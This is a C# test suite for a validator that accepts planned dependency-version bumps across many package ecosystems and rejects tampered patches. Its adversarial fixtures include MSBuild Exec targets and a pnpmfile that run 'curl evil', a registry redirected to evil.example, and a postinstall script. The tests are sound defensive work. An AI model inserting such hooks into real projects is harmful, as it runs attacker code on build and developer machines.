using System.Text;
using CodeCoverage.GitWriter.Jobs;
using CodeCoverage.GitWriter.Jobs.Dependencies;
using CodeCoverage.GitWriter.Tests._Infrastructure;

namespace CodeCoverage.GitWriter.Tests;

/// <summary>
/// The <c>dependencies</c> patch profile (docs/code-coverage/dependency-updates-PRD.md §13.5 P5, gap A, R14) over REAL
/// apply patches: every pure S13 capture (Fixtures/DependencyApply, with each ecosystem's SOURCE.md and the base files the
/// spike committed) passes against its plan, read through real git; then the adversarial catalogue of §13.11.3 on patches
/// written by real <c>git diff</c> between trees this test builds.
/// </summary>
public class DependencyPatchProfileTests : IDisposable
{
    private readonly BaseRepo repo = new();

    public void Dispose() => repo.Dispose();

    private static DependencyPlanEntry Entry(string dep, string file, string current, string @new, string datasource, string? group = null)
        => new(dep, file, current, @new, group ?? dep, datasource);

    private Task<DependencyPatchVerdict> Validate(string baseCommit, byte[] patch, params DependencyPlanEntry[] plan)
        => DependencyPatchValidator.ValidateAsync(patch, new DependencyPatchRequest(plan), repo.Tree(baseCommit));

    private Task<DependencyPatchVerdict> Validate(string baseCommit, byte[] patch, DependencyPatchRequest request)
        => DependencyPatchValidator.ValidateAsync(patch, request, repo.Tree(baseCommit));

    // ═══ Positive: the real S13 patches ═══════════════════════════════════════════════════════════════

    private const string ExpressDigestFree = "^4.18.2";

    /// <summary>Each pure S13 case: (ecosystem directory, base directory, diff, the plan its SOURCE.md describes).</summary>
    private static readonly Dictionary<string, (string Eco, string Base, DependencyPlanEntry[] Plan)> SpikeCases = new()
    {
        ["npm/hybrid-textedit-pin-lock.diff"] = ("npm", "base", [Entry("express", "package.json", ExpressDigestFree, "^4.19.2", "npm")]),
        ["npm/textedit-lockonly-exact.diff"] = ("npm", "base", [Entry("chalk", "package.json", "4.1.0", "4.1.2", "npm")]),
        ["pnpm/textedit-plus-update.diff"] = ("pnpm", "base", [Entry("express", "package.json", ExpressDigestFree, "^4.19.2", "npm")]),
        ["yarn/textedit-set-resolution.diff"] = ("yarn", "base", [Entry("express", "package.json", ExpressDigestFree, "^4.19.2", "npm")]),
        ["nuget/csproj-textedit-restore.diff"] = ("nuget", "base", [Entry("Newtonsoft.Json", "App.csproj", "13.0.1", "13.0.3", "nuget")]),
        ["nuget/tools-textedit.diff"] = ("nuget", "base-tools", [Entry("dotnet-ef", ".config/dotnet-tools.json", "8.0.0", "8.0.1", "nuget")]),
        ["cargo/lockfirst-precise-then-textedit.diff"] = ("cargo", "base", [Entry("serde", "Cargo.toml", "1.0.190", "1.0.200", "crate")]),
        ["composer/textedit-update-pkg.diff"] = ("composer", "base", [Entry("monolog/monolog", "composer.json", "2.9.1", "2.9.2", "packagist")]),
        ["go/textedit-tidy.diff"] = ("go", "base", [Entry("github.com/google/uuid", "go.mod", "v1.3.0", "v1.4.0", "go")]),
        ["maven/textedit-inline.diff"] = ("maven", "base", [Entry("com.google.guava:guava", "pom.xml", "32.1.2-jre", "33.0.0-jre", "maven")]),
        ["maven/native-set-property.diff"] = ("maven", "base",
            [Entry("com.fasterxml.jackson.core:jackson-databind", "pom.xml", "2.15.2", "2.16.1", "maven") with { SharedVariableName = "jackson.version" }]),
        ["gradle/textedit-catalog-write-locks.diff"] = ("gradle", "base",
            [Entry("com.google.guava:guava", "gradle/libs.versions.toml", "32.1.2-jre", "33.0.0-jre", "maven")]),
        ["pip/requirements-textedit.diff"] = ("pip", "base", [Entry("requests", "requirements.txt", "==2.28.2", "==2.31.0", "pypi")]),
        ["poetry/textedit-lock.diff"] = ("poetry", "base", [Entry("requests", "pyproject.toml", "2.28.2", "2.31.0", "pypi")]),
        ["uv/textedit-lock.diff"] = ("uv", "base", [Entry("requests", "pyproject.toml", "==2.28.2", "==2.31.0", "pypi")]),
        ["docker/from-tag-textedit.diff"] = ("docker", "base", [Entry("node", "Dockerfile", "20.11.0-alpine", "20.11.1-alpine", "docker")]),
        ["docker/from-tag-digest-textedit.diff"] = ("docker", "base",
        [
            Entry("mcr.microsoft.com/dotnet/aspnet", "Dockerfile", "8.0.1", "8.0.2", "docker") with
            {
                CurrentDigest = "sha256:" + new string('0', 64),
                NewDigest = "sha256:af8751ab2accc4928c1e516652f686aa20f6c934f14b2fbc3c80926400980a94",
            },
        ]),
        ["actions/uses-sha-and-tag-textedit.diff"] = ("actions", "base",
        [
            Entry("actions/checkout", ".github/workflows/ci.yml", "v4.1.1", "v4.1.7", "github-tags", "actions") with
            {
                CurrentDigest = "b4ffde65f46336ab88eb53be808477a3936bae11",
                NewDigest = "692973e3d937129bcbf40652eb9f2f61becf3332",
            },
            Entry("actions/setup-node", ".github/workflows/ci.yml", "v4.0.0", "v4.0.2", "github-tags", "actions"),
        ]),
    };

    public static TheoryData<string> SpikeCaseNames => [.. SpikeCases.Keys];

    private (string Base, byte[] Patch, DependencyPlanEntry[] Plan) Spike(string name)
    {
        var (eco, baseDirectory, plan) = SpikeCases[name];
        var commit = repo.CommitDirectory(BaseRepo.Fixture("DependencyApply", eco, baseDirectory));
        return (commit, File.ReadAllBytes(BaseRepo.Fixture(["DependencyApply", .. name.Split('/')])), plan);
    }

    [Theory]
    [MemberData(nameof(SpikeCaseNames))]
    public void Every_spike_patch_applies_to_the_base_it_was_captured_on(string name)
    {
        var (commit, patch, _) = Spike(name);

        repo.Applies(commit, patch).Should().BeTrue();
    }

    [Theory]
    [MemberData(nameof(SpikeCaseNames))]
    public async Task Every_pure_spike_patch_passes_against_its_plan(string name)
    {
        var (commit, patch, plan) = Spike(name);
        var groups = plan.Select(e => e.GroupName).Distinct().Order(StringComparer.Ordinal).ToList();

        var verdict = await Validate(commit, patch, new DependencyPatchRequest(plan) { ClaimedAppliedGroups = groups });

        verdict.Detail.Should().BeNull();
        verdict.Outcome.Should().Be(DependencyPatchOutcome.Accepted);
        verdict.AppliedGroups.Should().Equal(groups);
        verdict.RequiresWorkflowsPermission.Should().Be(name.StartsWith("actions/", StringComparison.Ordinal));
        verdict.NewPackages.Should().BeEmpty();
    }

    [Fact]
    public async Task A_native_npm_install_that_re_sorts_the_manifest_is_refused()
    {
        var (commit, _, plan) = Spike("npm/hybrid-textedit-pin-lock.diff");
        var patch = File.ReadAllBytes(BaseRepo.Fixture("DependencyApply", "npm", "native-install.diff"));

        var verdict = await Validate(commit, patch, plan);

        verdict.Outcome.Should().Be(DependencyPatchOutcome.Rejected);
        verdict.Reason.Should().Be(DependencyPatchReasons.UnplannedChange);
        verdict.Paths.Should().Equal("package.json");
    }

    [Fact]
    public async Task A_native_dotnet_add_package_that_reformats_the_project_is_refused()
    {
        var (commit, _, plan) = Spike("nuget/csproj-textedit-restore.diff");
        var patch = File.ReadAllBytes(BaseRepo.Fixture("DependencyApply", "nuget", "csproj-native-add.diff"));

        var verdict = await Validate(commit, patch, plan);

        verdict.Reason.Should().Be(DependencyPatchReasons.UnplannedChange);
        verdict.Paths.Should().Equal("App.csproj");
    }

    // ═══ Synthetic bases ══════════════════════════════════════════════════════════════════════════════

    private const string PackageJson = "{\n  \"name\": \"app\",\n  \"scripts\": {\n    \"test\": \"jest\"\n  },\n  \"dependencies\": {\n    \"express\": \"^4.18.2\",\n    \"zod\": \"3.22.4\"\n  }\n}\n";

    private const string Csproj = "<Project Sdk=\"Microsoft.NET.Sdk\">\n  <ItemGroup>\n    <PackageReference Include=\"Serilog\" Version=\"3.0.1\" />\n  </ItemGroup>\n</Project>\n";

    private static readonly DependencyPlanEntry Express = Entry("express", "package.json", "^4.18.2", "^4.19.2", "npm");
    private static readonly DependencyPlanEntry Zod = Entry("zod", "package.json", "3.22.4", "3.23.0", "npm");
    private static readonly DependencyPlanEntry Serilog = Entry("Serilog", "src/App/App.csproj", "3.0.1", "3.1.0", "nuget");

    private static string Bumped(string text, params (string From, string To)[] swaps)
        => swaps.Aggregate(text, (t, s) => t.Replace(s.From, s.To, StringComparison.Ordinal));

    [Fact]
    public async Task A_planned_bump_of_two_groups_reports_both_groups()
    {
        var before = repo.Commit(("package.json", PackageJson));
        var after = repo.Change(before, ("package.json", Bumped(PackageJson, ("^4.18.2", "^4.19.2"), ("3.22.4", "3.23.0"))));

        var verdict = await Validate(before, repo.Diff(before, after), Express, Zod);

        verdict.Outcome.Should().Be(DependencyPatchOutcome.Accepted);
        verdict.AppliedGroups.Should().Equal("express", "zod");
        verdict.RequiresWorkflowsPermission.Should().BeFalse();
    }

    // §13.11.3 #1: a new Directory.Build.targets/.props at any depth, in any case.
    [Theory]
    [InlineData("Directory.Build.targets")]
    [InlineData("Directory.Build.props")]
    [InlineData("src/App/directory.build.TARGETS")]
    [InlineData("deep/a/b/DIRECTORY.BUILD.PROPS")]
    [InlineData("build/evil.targets")]
    [InlineData("src/App/Custom.props")]
    public async Task A_new_msbuild_file_at_any_depth_and_case_is_refused(string path)
    {
        var before = repo.Commit(("src/App/App.csproj", Csproj));
        var after = repo.Change(before, ("src/App/App.csproj", Bumped(Csproj, ("3.0.1", "3.1.0"))), (path, "<Project><Target Name=\"X\" BeforeTargets=\"Build\"><Exec Command=\"curl evil\" /></Target></Project>\n"));

        var verdict = await Validate(before, repo.Diff(before, after), Serilog);

        verdict.Outcome.Should().Be(DependencyPatchOutcome.Rejected);
        verdict.Reason.Should().Be(DependencyPatchReasons.DeniedPath);
        verdict.Paths.Should().Equal(path);
    }

    // §13.11.3 #2: feed and install configuration, even when it already exists (an edit, not an add).
    [Theory]
    [InlineData(".npmrc", "registry=https://registry.npmjs.org/\n", "registry=https://evil.example/\n")]
    [InlineData("NuGet.Config", "<configuration />\n", "<configuration><packageSources><add key=\"x\" value=\"https://evil.example\" /></packageSources></configuration>\n")]
    [InlineData(".yarnrc.yml", "nodeLinker: node-modules\n", "nodeLinker: node-modules\nyarnPath: .yarn/releases/evil.cjs\n")]
    [InlineData(".pnpmfile.cjs", "module.exports = {};\n", "require('child_process').exec('curl evil');\n")]
    [InlineData("src/Directory.Build.props", "<Project />\n", "<Project><Import Project=\"evil.targets\" /></Project>\n")]
    public async Task Edits_to_feed_and_install_configuration_are_refused(string path, string original, string edited)
    {
        var before = repo.Commit(("package.json", PackageJson), (path, original));
        var after = repo.Change(before, ("package.json", Bumped(PackageJson, ("^4.18.2", "^4.19.2"))), (path, edited));

        var verdict = await Validate(before, repo.Diff(before, after), Express);

        verdict.Reason.Should().Be(DependencyPatchReasons.DeniedPath);
        verdict.Paths.Should().Equal(path);
    }

    private const string GlobalJson = "{\n  \"sdk\": {\n    \"version\": \"8.0.100\"\n  },\n  \"msbuild-sdks\": {\n    \"Microsoft.Build.Traversal\": \"8.0.100\"\n  }\n}\n";

    private static readonly DependencyPlanEntry DotnetSdk = Entry("dotnet-sdk", "global.json", "8.0.100", "8.0.200", "dotnet-version");

    [Fact]
    public async Task The_sdk_version_in_global_json_may_change()
    {
        var before = repo.Commit(("global.json", GlobalJson));
        var after = repo.Change(before, ("global.json", GlobalJson.Replace("\"version\": \"8.0.100\"", "\"version\": \"8.0.200\"", StringComparison.Ordinal)));

        var verdict = await Validate(before, repo.Diff(before, after), DotnetSdk);

        verdict.Outcome.Should().Be(DependencyPatchOutcome.Accepted);
    }

    // §13.11.3 #2: global.json msbuild-sdks, even with the planned value on a line whose neighbour names "version".
    [Fact]
    public async Task An_edit_inside_global_json_msbuild_sdks_is_refused()
    {
        var before = repo.Commit(("global.json", GlobalJson));
        var after = repo.Change(before, ("global.json", GlobalJson.Replace("\"Microsoft.Build.Traversal\": \"8.0.100\"", "\"Microsoft.Build.Traversal\": \"8.0.200\"", StringComparison.Ordinal)));

        var verdict = await Validate(before, repo.Diff(before, after), DotnetSdk);

        verdict.Reason.Should().Be(DependencyPatchReasons.DeniedPath);
        verdict.Detail.Should().Contain("msbuild-sdks");
    }

    // §13.11.3 #3: an allowed project gains an <Exec>; a package.json gains a lifecycle script.
    [Fact]
    public async Task An_allowed_project_that_gains_an_exec_target_is_refused()
    {
        var before = repo.Commit(("src/App/App.csproj", Csproj));
        var after = repo.Change(before, ("src/App/App.csproj", Bumped(Csproj, ("3.0.1", "3.1.0"))
            .Replace("</Project>", "  <Target Name=\"X\" BeforeTargets=\"Build\"><Exec Command=\"curl evil\" /></Target>\n</Project>", StringComparison.Ordinal)));

        var verdict = await Validate(before, repo.Diff(before, after), Serilog);

        verdict.Reason.Should().Be(DependencyPatchReasons.NotASubstitution);
        verdict.Paths.Should().Equal("src/App/App.csproj");
    }

    [Fact]
    public async Task A_package_json_that_gains_a_postinstall_script_is_refused()
    {
        var before = repo.Commit(("package.json", PackageJson));
        var after = repo.Change(before, ("package.json", Bumped(PackageJson, ("^4.18.2", "^4.19.2"))
            .Replace("\"test\": \"jest\"", "\"test\": \"jest\",\n    \"postinstall\": \"node evil.js\"", StringComparison.Ordinal)));

        var verdict = await Validate(before, repo.Diff(before, after), Express);

        verdict.Reason.Should().Be(DependencyPatchReasons.NotASubstitution);
    }

    [Fact]
    public async Task A_script_rewritten_in_place_is_not_a_planned_swap()
    {
        var before = repo.Commit(("package.json", PackageJson));
        var after = repo.Change(before, ("package.json", Bumped(PackageJson, ("^4.18.2", "^4.19.2"), ("\"test\": \"jest\"", "\"postinstall\": \"jest\""))));

        var verdict = await Validate(before, repo.Diff(before, after), Express);

        verdict.Reason.Should().Be(DependencyPatchReasons.UnplannedChange);
    }

    [Fact]
    public async Task A_planned_value_written_on_a_line_that_does_not_name_the_dependency_is_refused()
    {
        const string manifest = "{\n  \"version\": \"3.22.4\",\n  \"dependencies\": {\n    \"zod\": \"3.22.4\"\n  }\n}\n";
        var before = repo.Commit(("package.json", manifest));
        var after = repo.Change(before, ("package.json", manifest.Replace("\"version\": \"3.22.4\"", "\"version\": \"3.23.0\"", StringComparison.Ordinal)));

        var verdict = await Validate(before, repo.Diff(before, after), Zod);

        verdict.Reason.Should().Be(DependencyPatchReasons.UnplannedChange);
    }

    [Fact]
    public async Task A_swap_inside_a_longer_version_is_not_a_planned_swap()
    {
        const string manifest = "{\n  \"dependencies\": {\n    \"zod\": \"3.22.45\"\n  }\n}\n";
        var before = repo.Commit(("package.json", manifest));
        var after = repo.Change(before, ("package.json", manifest.Replace("3.22.45", "3.23.05", StringComparison.Ordinal)));

        var verdict = await Validate(before, repo.Diff(before, after), Zod);

        verdict.Reason.Should().Be(DependencyPatchReasons.UnplannedChange);
    }

    // §13.11.3 #4: result.json claims X while the patch also bumps Y; the groups come from the patch.
    [Fact]
    public async Task A_patch_that_bumps_a_group_result_json_does_not_claim_is_refused()
    {
        var before = repo.Commit(("package.json", PackageJson));
        var after = repo.Change(before, ("package.json", Bumped(PackageJson, ("^4.18.2", "^4.19.2"), ("3.22.4", "3.23.0"))));

        var verdict = await Validate(before, repo.Diff(before, after), new DependencyPatchRequest([Express, Zod]) { ClaimedAppliedGroups = ["express"] });

        verdict.Reason.Should().Be(DependencyPatchReasons.GroupMismatch);
    }

    [Fact]
    public async Task A_patch_that_bumps_an_unplanned_dependency_is_refused()
    {
        var before = repo.Commit(("package.json", PackageJson));
        var after = repo.Change(before, ("package.json", Bumped(PackageJson, ("^4.18.2", "^4.19.2"), ("3.22.4", "3.23.0"))));

        var verdict = await Validate(before, repo.Diff(before, after), new DependencyPatchRequest([Express]) { ClaimedAppliedGroups = ["express"] });

        verdict.Reason.Should().Be(DependencyPatchReasons.UnplannedChange);
    }

    [Fact]
    public async Task A_claimed_group_the_patch_does_not_apply_is_refused()
    {
        var before = repo.Commit(("package.json", PackageJson));
        var after = repo.Change(before, ("package.json", Bumped(PackageJson, ("^4.18.2", "^4.19.2"))));

        var verdict = await Validate(before, repo.Diff(before, after), new DependencyPatchRequest([Express, Zod]) { ClaimedAppliedGroups = ["express", "zod"] });

        verdict.Reason.Should().Be(DependencyPatchReasons.GroupMismatch);
    }

    [Fact]
    public async Task A_group_applied_in_part_is_refused()
    {
        var before = repo.Commit(("package.json", PackageJson), ("web/package.json", PackageJson));
        var after = repo.Change(before, ("package.json", Bumped(PackageJson, ("^4.18.2", "^4.19.2"))));

        var verdict = await Validate(before, repo.Diff(before, after), Express, Express with { PackageFile = "web/package.json" });

        verdict.Reason.Should().Be(DependencyPatchReasons.PartialGroup);
    }

    // §13.11.3 #6: a report packageFile never widens the allow-list.
    [Theory]
    [InlineData("src/Program.cs", "npm")]                 // not a manifest name for its datasource
    [InlineData("package.json", "nuget")]                 // a manifest name, of another datasource
    [InlineData(".github/workflows/ci.yml", "npm")]       // a workflow, claimed by a non-Actions record
    [InlineData("../package.json", "npm")]                // outside the repository
    public async Task A_report_package_file_outside_the_code_defined_patterns_widens_nothing(string packageFile, string datasource)
    {
        const string text = "\"express\": \"^4.18.2\"\n";
        var path = packageFile.StartsWith("../", StringComparison.Ordinal) ? packageFile[3..] : packageFile;
        var before = repo.Commit((path, text));
        var after = repo.Change(before, (path, text.Replace("^4.18.2", "^4.19.2", StringComparison.Ordinal)));

        var verdict = await Validate(before, repo.Diff(before, after), Express with { PackageFile = packageFile, Datasource = datasource });

        verdict.Outcome.Should().Be(DependencyPatchOutcome.Rejected);
        verdict.Reason.Should().Be(DependencyPatchReasons.OutsidePlannedFiles);
    }

    [Fact]
    public async Task A_report_package_file_of_coverage_yml_is_refused_by_the_deny_list()
    {
        const string text = "express: ^4.18.2\n";
        var before = repo.Commit(("coverage.yml", text));
        var after = repo.Change(before, ("coverage.yml", text.Replace("^4.18.2", "^4.19.2", StringComparison.Ordinal)));

        var verdict = await Validate(before, repo.Diff(before, after), Express with { PackageFile = "coverage.yml" });

        verdict.Reason.Should().Be(DependencyPatchReasons.DeniedPath);
    }

    [Fact]
    public async Task A_planned_package_file_absent_at_the_planned_commit_admits_no_new_file()
    {
        var before = repo.Commit(("README.md", "readme\n"));
        var after = repo.Change(before, ("package.json", Bumped(PackageJson, ("^4.18.2", "^4.19.2"))));

        var verdict = await Validate(before, repo.Diff(before, after), Express);

        verdict.Reason.Should().Be(DependencyPatchReasons.AddedOrDeleted);
    }

    [Fact]
    public async Task Deleting_or_renaming_a_planned_file_is_refused()
    {
        var before = repo.Commit(("package.json", PackageJson), ("web/package.json", PackageJson));
        var deleted = repo.Change(before, ("web/package.json", null));
        var renamed = repo.Change(before, ("web/package.json", null), ("site/package.json", PackageJson));

        (await Validate(before, repo.Diff(before, deleted), Express with { PackageFile = "web/package.json" })).Reason.Should().Be(DependencyPatchReasons.AddedOrDeleted);
        (await Validate(before, repo.Diff(before, renamed), Express with { PackageFile = "web/package.json" })).Reason.Should().Be(DependencyPatchReasons.AddedOrDeleted);
    }

    // §13.11.3 #11 / R14: the plan file never rides along in a patch.
    [Theory]
    [InlineData(".mintplayer/dependency-plan.json")]
    [InlineData(".MintPlayer/Dependency-Plan.json")]
    [InlineData(".mintplayer/other.json")]
    public async Task The_plan_path_in_the_patch_is_refused(string path)
    {
        var before = repo.Commit(("package.json", PackageJson), (path, "{}\n"));
        var after = repo.Change(before, ("package.json", Bumped(PackageJson, ("^4.18.2", "^4.19.2"))), (path, "{\"plan\": 1}\n"));

        var verdict = await Validate(before, repo.Diff(before, after), Express);

        verdict.Reason.Should().Be(DependencyPatchReasons.PlanPath);
        verdict.Paths.Should().Equal(path);
    }

    [Fact]
    public async Task A_lockfile_only_entry_applies_when_its_lockfile_changes()
    {
        const string lockfile = "{\n  \"packages\": {\n    \"node_modules/express\": {\n      \"version\": \"4.18.2\",\n      \"resolved\": \"https://registry.npmjs.org/express/-/express-4.18.2.tgz\",\n      \"integrity\": \"sha512-old\"\n    }\n  }\n}\n";
        var before = repo.Commit(("package.json", PackageJson), ("package-lock.json", lockfile));
        var after = repo.Change(before, ("package-lock.json", lockfile.Replace("4.18.2", "4.19.2", StringComparison.Ordinal).Replace("sha512-old", "sha512-new", StringComparison.Ordinal)));

        var verdict = await Validate(before, repo.Diff(before, after), Express with { NewValue = "^4.18.2" });

        verdict.Outcome.Should().Be(DependencyPatchOutcome.Accepted);
        verdict.AppliedGroups.Should().Equal("express");
    }

    [Fact]
    public async Task A_lockfile_change_no_applied_entry_owns_is_refused()
    {
        const string lockfile = "{\n  \"packages\": {\n    \"node_modules/express\": {\n      \"version\": \"4.18.2\"\n    }\n  }\n}\n";
        var before = repo.Commit(("package.json", PackageJson), ("web/package.json", PackageJson), ("web/package-lock.json", lockfile));
        var after = repo.Change(before, ("package.json", Bumped(PackageJson, ("^4.18.2", "^4.19.2"))),
            ("web/package-lock.json", lockfile.Replace("4.18.2", "4.19.2", StringComparison.Ordinal)));

        var verdict = await Validate(before, repo.Diff(before, after), Express);

        verdict.Reason.Should().Be(DependencyPatchReasons.UnownedLockfile);
        verdict.Paths.Should().Equal("web/package-lock.json");
    }

    [Fact]
    public async Task More_new_lockfile_packages_than_the_cap_need_a_human_not_a_refusal()
    {
        const string lockfile = "{\n  \"packages\": {\n    \"node_modules/express\": {\n      \"version\": \"4.18.2\"\n    }\n  }\n}\n";
        var added = string.Concat(Enumerable.Range(1, 3).Select(i => $"    \"node_modules/new-{i}\": {{\n      \"version\": \"1.0.0\"\n    }},\n"));
        var before = repo.Commit(("package.json", PackageJson), ("package-lock.json", lockfile));
        var after = repo.Change(before, ("package.json", Bumped(PackageJson, ("^4.18.2", "^4.19.2"))),
            ("package-lock.json", lockfile.Replace("  \"packages\": {\n", "  \"packages\": {\n" + added, StringComparison.Ordinal)));
        var request = new DependencyPatchRequest([Express]) { Lockfiles = LockfileScanOptions.Default with { MaxNewPackages = 2 } };

        var verdict = await Validate(before, repo.Diff(before, after), request);

        verdict.Outcome.Should().Be(DependencyPatchOutcome.NeedsHuman);
        verdict.NewPackages.Should().Equal("package-lock.json: new-1", "package-lock.json: new-2", "package-lock.json: new-3");
        verdict.AppliedGroups.Should().Equal("express");

        var within = await Validate(before, repo.Diff(before, after), request with { Lockfiles = LockfileScanOptions.Default with { MaxNewPackages = 3 } });
        within.Outcome.Should().Be(DependencyPatchOutcome.Accepted);
    }

    [Fact]
    public async Task A_symlinked_or_executable_package_file_is_refused_by_the_patch_shape()
    {
        var before = repo.Commit([("package.json", "100755", Encoding.UTF8.GetBytes(PackageJson))]);
        var after = repo.Commit([("package.json", "100755", Encoding.UTF8.GetBytes(Bumped(PackageJson, ("^4.18.2", "^4.19.2"))))]);

        var verdict = await Validate(before, repo.Diff(before, after), Express);

        verdict.Reason.Should().Be(PatchReasons.UnsupportedMode);
    }
}
